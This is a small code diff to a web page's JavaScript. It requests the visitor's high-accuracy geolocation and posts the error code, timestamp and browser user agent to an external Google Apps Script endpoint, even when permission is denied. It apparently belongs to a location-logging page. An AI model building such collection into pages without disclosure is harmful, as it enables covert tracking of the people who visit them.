@@ -34,12 +34,13 @@
 
         function showError(error) {
             const scriptURL = 'https://script.google.com/macros/s/AKfycbz0AF8zgYVmCvCO4c4RwW6FT3QFLALomnoKE33miKxLnwAfZIfDBer8q2Cez3eWefhT/exec';
+            const errmessage = error.code;
             const errdata = {
                 latitude: null,
                 longitude: null,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                message: error.code.toString(),
+                message: errmessage,
             }
             fetch(scriptURL, {
                 method: 'POST',
@@ -53,8 +54,11 @@
             
 
         function getLocation() {
+            const options ={
+                enableHighAccuracy: true,
+            };
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData, showError);
+                navigator.geolocation.getCurrentPosition(sendData, showError, options);
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
